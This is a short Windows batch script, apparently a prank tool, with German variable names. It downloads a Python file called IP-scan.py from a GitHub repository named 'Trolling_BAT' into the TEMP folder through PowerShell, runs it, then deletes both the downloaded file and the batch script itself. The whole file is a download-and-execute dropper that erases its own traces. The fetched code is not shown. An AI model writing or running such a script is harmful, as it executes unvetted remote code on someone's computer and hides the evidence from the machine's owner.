@echo off
setlocal

set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan.py"
set "ZIELDATEI=%TEMP%\IP-scan.py"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%ZIELDATEI%')"

python "%ZIELDATEI%"

timeout /t 2 >nul

del "%ZIELDATEI%"
del "%~f0"

endlocal
